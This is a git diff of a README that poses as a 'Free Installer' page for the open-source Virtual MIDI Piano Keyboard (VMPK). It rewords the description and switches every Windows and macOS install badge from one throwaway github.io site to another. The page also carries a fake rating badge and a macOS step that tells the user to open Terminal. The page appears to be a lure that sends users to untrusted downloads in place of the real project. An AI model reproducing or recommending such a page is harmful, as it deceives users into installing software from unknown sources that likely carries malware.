@@ -5,10 +5,10 @@
   <img src="https://img.shields.io/badge/Rating-4.9%2F5-F9A825?style=for-the-badge&logo=star" />
   <img src="https://img.shields.io/badge/Version-2026-101010?style=for-the-badge&logo=github" />
   <img src="https://img.shields.io/badge/Platform-Windows%20%7C%20macOS-informational?style=for-the-badge&logo=windows" />
-  <img src="https://img.shields.io/badge/Category-MIDI+Tool-E63946?style=for-the-badge&logo=appstore" />
+  <img src="https://img.shields.io/badge/Category-Music+Tool-E63946?style=for-the-badge&logo=appstore" />
 </p>
 
-**💻 Virtual MIDI Piano Keyboard Free Installer** — Virtual MIDI Piano Keyboard (VMPK) is a free, open-source MIDI controller application for Windows, macOS, and Linux. Works without internet access, no account required. Full offline installation.
+**💻 Virtual MIDI Piano Keyboard Free Installer** — Virtual MIDI Piano Keyboard (VMPK) is a free, cross-platform MIDI controller that provides an on-screen piano keyboard for sending MIDI note messages to instruments and DAWs when a physical keyboard is unavailable. Works without internet access, no account required. Full offline installation.
 
 <p align="center">
   <img src="https://skillicons.dev/icons?i=windows" />
@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install Virtual MIDI Piano Keyboard](https://img.shields.io/badge/⬇_Install_Virtual+MIDI+Piano+Keyboard-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install Virtual MIDI Piano Keyboard](https://img.shields.io/badge/⬇_Install_Virtual+MIDI+Piano+Keyboard-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
@@ -30,16 +30,16 @@
 
 ## 📖 About Virtual MIDI Piano Keyboard
 
-Virtual MIDI Piano Keyboard (VMPK) is a free, open-source MIDI controller application for Windows, macOS, and Linux. Use your computer keyboard or mouse to play MIDI notes and control MIDI instruments. Connect VMPK to a DAW or soft synth for real-time MIDI input without a physical MIDI controller. Useful for music theory practice and testing MIDI connections.
+Virtual MIDI Piano Keyboard (VMPK) is a free, cross-platform MIDI controller that provides an on-screen piano keyboard for sending MIDI note messages to instruments and DAWs when a physical keyboard is unavailable.
 
 ---
 
 ## ❌ Problem: Virtual MIDI Piano Keyboard is hard to access
 
-- **Limited Expression** — Computer keyboard lacks velocity and aftertouch of physical MIDI keyboard
-- **MIDI Routing** — Requires virtual MIDI driver setup on Windows for inter-application routing
-- **Interface Simplicity** — Basic interface without advanced MIDI control features
-- **Latency** — Computer keyboard input adds latency compared to dedicated MIDI hardware
+- **Touch/Mouse Input** — On-screen keyboard is significantly less expressive than physical keys
+- **No Sound Generation** — MIDI controller only; requires virtual instrument or hardware synth
+- **Basic Interface** — Functional but minimal; no velocity sensitivity without touch display
+- **Practical Limitations** — Useful as a quick test tool rather than a performance instrument
 
 ---
 
@@ -61,9 +61,9 @@ Virtual MIDI Piano Keyboard (VMPK) is a free, open-source MIDI controller applic
 
 <div align="center">
 
-[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://zenboulderagora.github.io/Windw/)
+[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://yobowgileysb.github.io/WinDownload/)
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
 
 </div>
 
@@ -81,7 +81,7 @@ Virtual MIDI Piano Keyboard (VMPK) is a free, open-source MIDI controller applic
 
 <div align="center">
 
-[![⬇ Install Virtual MIDI Piano Keyboard](https://img.shields.io/badge/⬇_Install_Virtual+MIDI+Piano+Keyboard-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install Virtual MIDI Piano Keyboard](https://img.shields.io/badge/⬇_Install_Virtual+MIDI+Piano+Keyboard-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
@@ -100,7 +100,7 @@ Virtual MIDI Piano Keyboard (VMPK) is a free, open-source MIDI controller applic
 
 ## 🍎 macOS Installation
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
 
 1. Click the badge above to open the macOS installer page
 2. Open **Terminal** (`⌘ + Space` → type Terminal → Enter)
@@ -121,11 +121,11 @@ Virtual MIDI Piano Keyboard (VMPK) is a free, open-source MIDI controller applic
 
 ---
 
-**Virtual MIDI Piano Keyboard Free Installer** — Virtual MIDI Piano Keyboard (VMPK) is a free, open-source MIDI controller application for Windows, macOS, and Linux. Install without internet connection today!
+**Virtual MIDI Piano Keyboard Free Installer** — Virtual MIDI Piano Keyboard (VMPK) is a free, cross-platform MIDI controller that provides an on-screen piano keyboard for sending MIDI note messages to instruments and DAWs when a physical keyboard is unavailable. Install without internet connection today!
 
 <div align="center">
 
-[![⬇ Install Virtual MIDI Piano Keyboard](https://img.shields.io/badge/⬇_Install_Virtual+MIDI+Piano+Keyboard-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install Virtual MIDI Piano Keyboard](https://img.shields.io/badge/⬇_Install_Virtual+MIDI+Piano+Keyboard-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
